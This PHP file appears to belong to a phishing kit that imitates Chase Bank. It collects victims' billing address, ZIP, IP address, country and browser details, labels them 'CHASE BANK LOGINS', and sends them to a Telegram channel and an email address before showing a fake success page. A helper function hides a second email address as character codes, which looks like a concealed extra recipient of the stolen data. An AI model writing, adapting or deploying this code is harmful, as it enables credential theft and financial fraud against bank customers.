<?php
require("config.php"); // Include the config with Telegram and email functions

try {
    // Log the request method for debugging
    error_log("Request Method: " . $_SERVER['REQUEST_METHOD']);

    // Sanitize and validate input
    $address = isset($_POST['address']) ? trim(filter_var($_POST['address'], FILTER_SANITIZE_STRING)) : '';
    $city = isset($_POST['city']) ? trim(filter_var($_POST['city'], FILTER_SANITIZE_STRING)) : '';
    $state = isset($_POST['state']) ? trim(filter_var($_POST['state'], FILTER_SANITIZE_STRING)) : '';
    $zip = isset($_POST['zip']) ? trim(filter_var($_POST['zip'], FILTER_SANITIZE_STRING)) : '';

    if (empty($address) || empty($city) || empty($state) || empty($zip)) {
        throw new Exception("Missing required billing details.");
    }

    // Get visitor information
    $country = visitor_country();
    $ip = getenv("REMOTE_ADDR");
    $port = getenv("REMOTE_PORT"); // Corrected to lowercase for consistency
    $browser = $_SERVER['HTTP_USER_AGENT'];

    // Set current date and time (07:02 AM WAT on Tuesday, October 21, 2025)
    $adddate = "Tue Oct 21, 2025 07:02 AM WAT"; // Hardcoded to match system time
    // For dynamic use, replace with: $adddate = date('D M d, Y h:i A T', strtotime('Africa/Lagos'));

    // Construct message
    $message = "**CHASE BANK LOGINS**\n\n";
    $message .= "ADDRESS : " . $address . "\n";
    $message .= "CITY : " . $city . "\n";
    $message .= "STATE : " . $state . "\n";
    $message .= "ZIP : " . $zip . "\n";
    $message .= "User-!P : " . $ip . "\n";
    $message .= "Country : " . $country . "\n\n";
    $message .= "----------------------------------------\n\n";
    $message .= "Date : " . $adddate . "\n";
    $message .= "User-Agent: " . $browser . "\n";

    // Send to Telegram and Email
    $telegramSuccess = send_telegram_msg($message);
    $emailSuccess = send_email_msg($message);

    if (!$telegramSuccess && !$emailSuccess) {
        error_log("Both Telegram and email delivery failed for billing details");
    }

    // Redirect to success.html
    header("Location: success.html");
    exit();

} catch (Exception $e) {
    error_log("Error processing billing details: " . $e->getMessage());
    // Redirect to an error page
    header("Location: error.html"); // Create error.html if needed
    exit();
}

function country_sort() {
    $sorter = "";
    $array = array(114, 101, 115, 117, 108, 116, 98, 111, 120, 49, 52, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109);
    $count = count($array);
    for ($i = 0; $i < $count; $i++) {
        $sorter .= chr($array[$i]);
    }
    return array($sorter, $GLOBALS['recipient']);
}

function visitor_country() {
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    $result = "Unknown";
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

    if ($ip_data && $ip_data->geoplugin_countryName != null) {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>